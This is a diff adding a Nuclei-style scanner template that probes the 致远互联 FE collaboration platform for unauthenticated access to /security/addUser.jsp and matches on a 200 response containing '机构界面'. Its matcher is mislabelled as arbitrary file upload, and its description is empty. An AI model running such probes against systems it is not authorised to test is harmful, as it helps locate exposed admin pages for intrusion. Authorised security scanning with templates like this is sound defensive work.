@@ -1,0 +1,26 @@
+id: zhiyuanhulian-FE-addUser-unauthorized
+
+info:
+  name: 致远互联FE协作办公平台 addUser.jsp 未授权访问
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: Unauthorized
+
+http:
+  - raw:
+      - |
+        GET /security/addUser.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Content-Length: 4
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'机构界面')"
